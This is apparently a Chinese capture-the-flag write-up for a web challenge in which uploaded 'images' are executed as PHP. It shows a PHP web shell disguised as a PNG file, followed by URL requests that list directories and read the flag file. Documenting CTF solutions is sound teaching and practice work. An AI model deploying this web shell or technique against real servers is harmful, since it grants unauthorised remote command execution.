# ?CTF 2025 Platform(公开赛道)[Week2] Only Picture Up (难度：Easy)
**Writer：DreamLost（QQ ID：Scarlet Secret）**<br>
**Solve Time: 2025-10-11 15:08:08**<br>
**Rank #21**<br>
## 题目背景
咦？上传一个图片就能得到flag？<br>

## 解题思路
这是一个十分经典的**不检查文件内容**便直接上传
进入靶机的web页面，随便上传一张正常的图片，并点击下面的“Preview”
即访问：`http://challenge.ilovectf.cn:30240/?preview=test.png`<br>
浏览器返回了这样的信息：`Parse error: syntax error, unexpected '?', expecting end of file in /var/www/html/uploads/test.png on line 84`

这刚好证实了我一开始的猜想，而且**试图把png图片文件当成php文件执行**

那还说啥，直接构造这样的php脚本（名字随意，这里在windows11下创建demo.txt）
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
改成demo.png之后直接上传并点击preview
虽然浏览器返回了空页面，但是我们仍然可以正常执行，只需要加上`&cmd=`

让我们试试执行一次llinux上最常用的ls
`http://challenge.ilovectf.cn:30240/?preview=demo.png&cmd=ls`<br>

返回：`index.php uploads`
不用担心，虽然用户是www-data，但是我们不妨去碰碰运气，先去根目录下看看，因为如果使用“find”或者“grep”来大规模搜索，web服务很可能会失去响应。
```php
http://challenge.ilovectf.cn:30240/?preview=demo.png&cmd=ls%20/
FL4g94 bin dev etc home init.sh lib media mnt opt proc root run sbin srv sys tmp usr var
```
我们看见根目录下有个神秘文件FL4g94，那很可能藏着我们正在寻找的flag
立刻在webshell使用cat，得到：
```php
http://challenge.ilovectf.cn:30240/?preview=demo.png&cmd=cat%20/FL4g94
flag{fff3a839-714d-436c-95ce-9788fe586806}
```
至此，flag已出